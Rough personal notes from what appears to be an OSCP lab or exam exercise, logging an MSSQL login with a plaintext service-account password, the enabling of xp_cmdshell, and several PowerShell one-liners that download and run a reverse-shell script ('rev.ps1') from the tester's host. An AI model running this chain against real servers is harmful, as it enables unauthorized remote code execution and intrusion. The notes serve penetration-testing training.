# nmap 

```

```

since it is open, i have the cred of 
username: :
password: SQLPowerHouse333

run  impacket-mssqlclient svc_sql:SQLPowerHouse333@172.16.114.202 -windows-auth

```
┌──(kali㉿kali)-[~/OSCP/Exam/AD/172.16.114.202]
└─$ impacket-mssqlclient svc_sql:SQLPowerHouse333@172.16.114.202 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SRV22): Line 1: Changed database context to 'master'.
[*] INFO(SRV22): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (OSCP\svc_sql  dbo@master)> 
SQL (OSCP\svc_sql  dbo@master)> select SYSTEM_USER;
               
------------   
OSCP\svc_sql   

SQL (OSCP\svc_sql  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
    
-   
1   

SQL (OSCP\svc_sql  dbo@master)> 


SQL (OSCP\svc_sql  dbo@master)> EXEC sp_configure 'show advance options', 1;
ERROR(SRV22): Line 62: The configuration option 'show advance options' does not exist, or it may be an advanced option.
SQL (OSCP\svc_sql  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(SRV22): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\svc_sql  dbo@master)> RECONFIGURE
SQL (OSCP\svc_sql  dbo@master)> RECONFIGURE;
SQL (OSCP\svc_sql  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(SRV22): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\svc_sql  dbo@master)> RECONFIGURE;
SQL (OSCP\svc_sql  dbo@master)> EXEC xp_cmdshell 'whoami';
output                   
----------------------   
nt service\mssqlserver   

NULL  

```

let us run xp_cmdshell

```

SQL (OSCP\svc_sql  dbo@master)> EXEC sp_configure 'show advance options', 1;
ERROR(SRV22): Line 62: The configuration option 'show advance options' does not exist, or it may be an advanced option.
SQL (OSCP\svc_sql  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(SRV22): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\svc_sql  dbo@master)> RECONFIGURE
SQL (OSCP\svc_sql  dbo@master)> RECONFIGURE;
SQL (OSCP\svc_sql  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(SRV22): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (OSCP\svc_sql  dbo@master)> RECONFIGURE;
SQL (OSCP\svc_sql  dbo@master)> EXEC xp_cmdshell 'whoami';
output                   
----------------------   
nt service\mssqlserver   

NULL  
```

downlaod the file now 

powershell -Exec ByPass -NoProfile -c "(New-Object Net.WebClient).DownloadString('http://192.168.49.114:8000/rev.ps1') | IEX"


```bash
EXEC xp_cmdshell 'powershell -w  "IEX((New-Object Net.WebClient).DownloadString(''http://192.168.49.114:8000/rev.ps1''))"'
```

``` bash
 EXEC xp_cmdshell ' powershell -ExecutionPolicy Bypass -Command "[scriptblock]::Create((Invoke-WebRequest "http://192.168.49.114:8000/rev.ps1").Content).Invoke();"'


SQL (OSCP\svc_sql  dbo@master)>  EXEC xp_cmdshell ' powershell -ExecutionPolicy Bypass -Command "[scriptblock]::Create((Invoke-WebRequest "http://192.168.49.114:8000/rev.ps1").Content).Invoke();"'
output                                                                                                                    
-----------------------------------------------------------------------------------------------------------------------                                                                                                                     
Invoke-WebRequest : Unable to connect to the remote server                                                                                                                                                                                  
                                                                                                                                                                                                                                            
At line:1 char:24                                                                                                                                                                                                                           

+ ... k]::Create((Invoke-WebRequest http://192.168.49.114:8000/rev.ps1).Con ...                                           

+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                    

    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc    

   eption                                                                                                                 

    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand         

                                                                                                                          

NULL                                                                                                                      

SQL (OSCP\svc_sql  dbo@master)> 

```